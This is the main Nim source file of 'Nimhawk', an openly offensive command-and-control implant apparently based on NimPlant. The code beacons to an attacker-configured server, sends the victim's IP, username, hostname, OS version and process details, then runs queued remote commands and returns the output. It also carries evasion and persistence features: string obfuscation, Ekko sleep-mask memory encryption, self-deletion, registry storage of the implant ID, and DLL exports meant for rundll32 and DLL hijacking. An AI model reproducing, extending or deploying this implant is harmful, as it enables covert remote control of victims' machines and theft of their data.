#[

    Nimhawk - A Powerful, modular, lightweight and efficient implant written in Nim
    by Alejandro Parodi (hdbreaker / @SecSignal)

    Heavily based on @chvancooten NimPlant project.

]#
from os import sleep
from random import rand
from strutils import parseBool, parseInt, split
from math import `^`
import tables, times
import core/webClientListener
import config/configParser
import util/[strenc, winUtils, register]
import core/cmdParser

when defined sleepmask:
    import selfProtections/ekko_sleep/ekko
else:
    from os import sleep

when defined selfdelete:
    import selfProtections/selfDelete/selfDelete

var riskyMode = false
when defined risky:
    riskyMode = true

# Parse the configuration at compile-time
let CONFIG : Table[string, string] = configParser.parseConfig()

const version: string = "=== Nimhawk v1.0 ==="

# IMPORTANT: Export runNp correctly
proc runNp() {.exportc, cdecl.} =
    echo version

    # Get configuration information and create Listener object
    var listener = Listener(
        killDate: CONFIG[obf("killDate")],
        listenerHost: CONFIG[obf("hostname")],
        implantCallbackIp: CONFIG[obf("implantCallbackIp")],
        listenerPort: CONFIG[obf("listenerPort")],
        listenerType: CONFIG[obf("listenerType")],
        registerPath: CONFIG[obf("listenerRegPath")],
        resultPath: CONFIG[obf("listenerResPath")],
        reconnectPath: CONFIG[obf("reconnectPath")],
        sleepTime: parseInt(CONFIG[obf("sleepTime")]),
        sleepJitter: parseInt(CONFIG[obf("sleepJitter")]) / 100,
        taskPath: CONFIG[obf("listenerTaskPath")],
        userAgent: CONFIG[obf("userAgent")],
        httpAllowCommunicationKey: CONFIG[obf("httpAllowCommunicationKey")]
    )

    # Set the number of times the Implant will try to register or connect before giving up
    let maxAttempts = 3
    var 
        currentAttempt = 0
        sleepMultiplier = 1 # For exponential backoff

    # Handle exponential backoff for failed registrations and check-ins
    proc handleFailedRegistration() : void =
        sleepMultiplier = 3^currentAttempt
        inc currentAttempt

        if currentAttempt > maxAttempts:
            when defined verbose:
                echo obf("DEBUG: Hit maximum retry count, giving up.")
            quit(0)

        when defined verbose:
            echo obf("DEBUG: Attempt: ") & $currentAttempt & obf("/") & $maxAttempts & obf(".")

    proc handleFailedCheckin() : void =
        sleepMultiplier = 3^currentAttempt
        inc currentAttempt

        if currentAttempt > maxAttempts:
            when defined verbose:
                echo obf("DEBUG: Hit maximum retry count, attempting re-registration.")
            currentAttempt = 0
            sleepMultiplier = 1
            listener.initialized = false
            listener.registered = false
        else:
            when defined verbose:
                echo obf("DEBUG: Server connection lost. Attempt: ") & $currentAttempt & obf("/") & $maxAttempts & obf(".")


    # Main loop
    while true:
        var
            cmdGuid : string
            cmd : string
            args : seq[string]
            output : string
            timeToSleep : int

        # Check if the kill timer expired, announce kill if registered
        # We add a day to make sure the specified date is still included
        if listener.killDate != "":
            if parse(listener.killDate, "yyyy-MM-dd") + initDuration(days = 1) < now():
                if listener.UNIQUE_XOR_KEY != "":
                    listener.killSelf()
                
                when defined verbose: 
                    echo obf("DEBUG: Kill timer expired. Goodbye cruel world!")
                    
                quit(0)

        # Attempt to register with server if no successful registration has occurred
        if not listener.registered:
            try:
                # Try reconnection first (UNCOMMENT)
                listener.reconnect() # reconnect will change listener.initialized to true if successful and set the new UNIQUE_XOR_KEY and id to current process
                
                # If still not initialized after reconnection attempt
                if not listener.initialized:
                    # Initialize
                    listener.init()
                
                    # If initialization failed, handle it / try again
                    if not listener.initialized:
                        when defined verbose:
                            echo obf("DEBUG: Failed to initialize listener.")
                        handleFailedRegistration()

                    # If is successfully initialized, register and check succesful registration
                    if listener.initialized:
                        listener.postRegisterRequest(
                            winUtils.getIntIp(), 
                            winUtils.getUsername(), 
                            winUtils.getHost(), 
                            winUtils.getWindowsVersion(), 
                            winUtils.getProcId(), 
                            winUtils.getProcName(), 
                            riskyMode
                        )
                        if not listener.registered:
                            when defined verbose:
                                echo obf("DEBUG: Failed to register with server.")
                            handleFailedRegistration()
                
                    # Succesful registration, reset the sleep modifier if set and enter main loop
                    if listener.registered:
                        when defined verbose:
                            echo obf("DEBUG: Successfully registered with server as ID: ") & $listener.id & obf(".")

                        let success = register.storeImplantID(listener.id)
                        if not success:
                            when defined verbose:
                                echo obf("DEBUG: Failed to store implant ID in registry.")
            except:
                when defined verbose:
                    echo obf("DEBUG: Got unexpected exception when attempting to register: ") & getCurrentExceptionMsg()
                handleFailedRegistration()
        
        # Otherwise, process commands from registered server
        else: 
            # Check C2 server for an active command
            (cmdGuid, cmd, args) = listener.getQueuedCommand()
            
            # If a connection error occured, the server went down or restart - drop back into initial registration loop
            if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
                cmd = ""
                handleFailedCheckin()
            else:
                currentAttempt = 0
                sleepMultiplier = 1

            # If a command was found, execute it
            if cmd != "":
                when defined verbose:
                    echo obf("DEBUG: Got command '") & $cmd & obf("' with args '") & $args & obf("'.")

                # Handle commands that directly impact the listener object here
                if cmd == obf("sleep"):
                    try: 
                        if len(args) == 2:
                            listener.sleepTime = parseInt(args[0])
                            var jit = parseInt(args[1])
                            listener.sleepJitter = if jit < 0: 0.0 elif jit > 100: 1.0 else: jit / 100
                        else:
                            listener.sleepTime = parseInt(args[0])
                            
                        output = obf("Sleep time changed to ") & $listener.sleepTime & obf(" seconds (") & $(toInt(listener.sleepJitter*100)) & obf("% jitter).")
                    except:
                        output = obf("Invalid sleep time.")
                elif cmd == obf("kill"):
                    # Clean up registry entry before quitting
                    when defined verbose:
                        echo obf("DEBUG: Received kill command, removing implant ID from registry before exiting")
                    let cleanupResult = register.removeImplantIDFromRegistry()
                    when defined verbose:
                        if cleanupResult:
                            echo obf("DEBUG: Successfully removed implant ID from registry")
                        else:
                            echo obf("DEBUG: Failed to remove implant ID from registry")
                    quit(0)
                # Otherwise, parse commands via 'cmdParser.nim'
                else:   
                    output = listener.parseCmd(cmd, cmdGuid, args)
                    
                if output != "":
                    listener.postCommandResults(cmdGuid, output)

        # Sleep the main thread for the configured sleep time and a random jitter %, including an exponential backoff multiplier
        timeToSleep = sleepMultiplier * toInt(listener.sleepTime.float - (listener.sleepTime.float * rand(-listener.sleepJitter..listener.sleepJitter)))

        when defined sleepmask:
            # Ekko Sleep obfuscation, encrypts the PE memory, set's permissions to RW and sleeps for the specified time
            when defined verbose:
                echo obf("DEBUG: Sleeping for ") & $timeToSleep & obf(" seconds using Ekko sleep mask.")
            ekkoObf(timeToSleep * 1000)
        else:
            when defined verbose:
                echo obf("DEBUG: Sleeping for ") & $timeToSleep & obf(" seconds.")
            sleep(timeToSleep * 1000)

when defined exportDll:
    {.passL: "-Wl,--enable-stdcall-fixup -Wl,--kill-at".}
    
    # Exports for rundll32 and DLL hijacking - WITHOUT DllMain
    {.emit: """
    #include <windows.h>
    
    // Simple function that only displays a message
    __declspec(dllexport) void __stdcall runDLL(void) {
        runNp();
    }

    // Another function for hijacking with different name to avoid conflicts
    __declspec(dllexport) BOOL __stdcall VerQueryValueW(
        const void* pBlock,
        const wchar_t* lpSubBlock, 
        void** lplpBuffer,
        unsigned int* puLen
    ) {
        runNp();
        return TRUE;
    }
    """.}
else:
    when isMainModule:
        when defined selfdelete:
            selfDelete.selfDelete()
        runNp()